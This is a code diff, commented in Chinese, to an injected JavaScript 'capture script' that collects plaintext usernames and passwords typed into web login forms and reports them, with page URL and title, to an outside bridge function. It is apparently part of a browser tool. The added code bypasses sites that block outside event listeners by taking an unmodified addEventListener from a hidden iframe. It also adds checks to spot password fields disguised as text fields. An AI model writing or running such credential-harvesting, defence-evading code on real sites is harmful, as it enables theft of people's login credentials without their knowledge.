@@ -74,6 +74,55 @@ export const CAPTURE_SCRIPT = `
   window.__baop_pw_capture = true;
   function _baopEmit(payload){try{window.__baopReport(JSON.stringify(payload));}catch(e){}}
   _baopEmit({_type:'baop_diag',msg:'script loaded host='+location.hostname});
+  // 监听器环境自检（2026-09-21）：部分站点改写 EventTarget.prototype.addEventListener
+  // 来屏蔽外部脚本的监听（反自动填充/反调试）。被改写时我们的 input/click/submit 全部失效，
+  // 而 setTimeout/轮询照常 —— 症状恰好是"有 frame info、却零 input 事件"。
+  // 兜底做法：从同源 about:blank iframe 里取一份未被改写的 addEventListener 来注册监听。
+  function _baopPristineAdd() {
+    try {
+      var f = document.createElement('iframe');
+      f.style.display = 'none';
+      (document.documentElement || document.body || document).appendChild(f);
+      var fn = f.contentWindow && f.contentWindow.EventTarget && f.contentWindow.EventTarget.prototype.addEventListener;
+      if (f.parentNode) f.parentNode.removeChild(f);
+      return (typeof fn === 'function') ? fn : null;
+    } catch(e) { return null; }
+  }
+  var _baopCleanAdd = _baopPristineAdd();
+  var _baopPatched = false;
+  try {
+    // 注意：不能直接比较函数引用（iframe 与主文档本就是不同 realm，恒不相等）。
+    // 用实现源码比较：页面只是包装/替换时源码会变，跨 realm 不会。
+    _baopPatched = !!(_baopCleanAdd && String(_baopCleanAdd) !== String(EventTarget.prototype.addEventListener));
+  } catch(e) {}
+  // 用合成事件验证"哪条注册路径真的生效"：优先干净版，不通就全程退回原生。
+  // 不验证就切到干净版有风险——某些页面/隔离世界里跨 realm 调用可能静默失效。
+  var _baopSelfTestHit = false;
+  (function() {
+    function tryOn(register) {
+      var probe = function() { _baopSelfTestHit = true; };
+      _baopSelfTestHit = false;
+      try { register('__baop_probe', probe); } catch(e) { return false; }
+      try { document.dispatchEvent(new Event('__baop_probe', { bubbles: true })); } catch(e) {}
+      try { document.removeEventListener('__baop_probe', probe, true); } catch(e) {}
+      return _baopSelfTestHit;
+    }
+    var okClean = false;
+    if (_baopCleanAdd) {
+      okClean = tryOn(function(t, h) { _baopCleanAdd.call(document, t, h, true); });
+    }
+    if (!okClean) {
+      _baopCleanAdd = null;
+      tryOn(function(t, h) { document.addEventListener(t, h, true); });
+    }
+  })();
+  function _baopOn(target, type, handler) {
+    try {
+      if (_baopCleanAdd) { _baopCleanAdd.call(target, type, handler, true); return; }
+    } catch(e) { /* 退回原生 */ }
+    target.addEventListener(type, handler, true);
+  }
+  _baopEmit({_type:'baop_diag',msg:'listener env patched='+_baopPatched+' cleanAdd='+(_baopCleanAdd?'yes':'no')+' selftest='+_baopSelfTestHit+' host='+location.hostname});
   var _rawUser='',_rawPass='';
   var extractCredentialParams = (${extractCredentialParams.toString()});
   var extractCredentialPayload = (${extractCredentialPayload.toString()});
@@ -87,18 +136,31 @@ export const CAPTURE_SCRIPT = `
     _baopEmit({_type:'baop_capture',user:_rawUser||'',pass:_rawPass,host:location.hostname,origin:location.href,title:document.title,source:src});
     _rawPass='';_rawUser='';
   }
-  document.addEventListener('input',function(e){
+  _baopOn(document,'input',function(e){
     if(e.target.type!=='password')return;
     _rawPass=e.target.value;
     var c=e.target.closest('form')||e.target.closest('[class*="login"]')||e.target.closest('[class*="con"]')||e.target.closest('[class*="pop"]')||document;
     var u=findUserInput(c);if(u&&u.value)_rawUser=u.value;
     _baopEmit({_type:'baop_diag',msg:'input pw len='+_rawPass.length+' host='+location.hostname});
-  },true);
+  });
+  // 诊断（每 frame 一次）：记录"首次非密码输入"落在哪个元素上 ——
+  // 若站点把密码框换成 type=text + CSS 遮罩（规避密码管理器），这里是唯一能看到证据的地方。
+  var _firstInputDiagDone = false;
+  _baopOn(document,'input',function(e){
+    try {
+      if (_firstInputDiagDone) return;
+      var t = (e && e.target) || {};
+      if (String(t.type || '').toLowerCase() === 'password') return;
+      _firstInputDiagDone = true;
+      _baopEmit({_type:'baop_diag',msg:'first input tag='+(t.tagName||'?')+' type='+(t.type||'-')
+        +' id='+(t.id||'-')+' name='+(t.name||'-')+' host='+location.hostname});
+    } catch(err) {}
+  });
   // 诊断兜底（每 frame 只报一次）：若页面在 window 捕获阶段 stopPropagation 吞掉 input
   // 事件，本 frame 将完全没有证据，排查只能靠猜。记录"首次键盘输入落在哪个元素上"，
   // 即可判定键盘输入是否真的进到本 frame 的 DOM（以及落在什么类型元素上）。
   var _firstKeyDiagDone = false;
-  window.addEventListener('keydown', function(e) {
+  _baopOn(window,'keydown',function(e) {
     try {
       if (_firstKeyDiagDone) return;
       _firstKeyDiagDone = true;
@@ -106,15 +168,15 @@ export const CAPTURE_SCRIPT = `
       _baopEmit({_type:'baop_diag',msg:'first keydown tag='+(t.tagName||'?')+' type='+(t.type||'-')
         +' pwDoc='+document.querySelectorAll('input[type="password"]').length+' host='+location.hostname});
     } catch(err) {}
-  }, true);
-  document.addEventListener('submit',function(e){
+  });
+  _baopOn(document,'submit',function(e){
     var p=e.target.querySelector('input[type="password"]');
     _baopEmit({_type:'baop_diag',msg:'submit form='+e.target.tagName+' hasPw='+(!!p)+' host='+location.hostname});
     if(!p||!p.value||p.value.length<2)return;
     var u=findUserInput(e.target);
     _baopEmit({_type:'baop_capture',user:u?u.value:'',pass:p.value,host:location.hostname,origin:location.href,title:document.title,source:'submit'});
   },true);
-  window.addEventListener('beforeunload',function(){
+  _baopOn(window,'beforeunload',function(){
     _baopEmit({_type:'baop_diag',msg:'beforeunload pwLen='+(_rawPass?_rawPass.length:0)+' host='+location.hostname});
     if(_rawPass&&_rawPass.length>=2)report('beforeunload');
   });
@@ -241,7 +303,7 @@ export const CAPTURE_SCRIPT = `
   // 点在登录容器内，就先上报一条 'click any' 诊断，把判断依据一次说清：
   //   pwDoc      = 本 frame 内 input[type=password] 数量（0 说明登录框不在本 frame）
   //   hasRawPass = 本 frame 闭包是否已拿到密码（0 说明输入没发生在本 frame）
-  document.addEventListener('click', function(e) {
+  _baopOn(document,'click',function(e) {
     try {
       var target = e.target;
       if (!target || !target.closest) return;
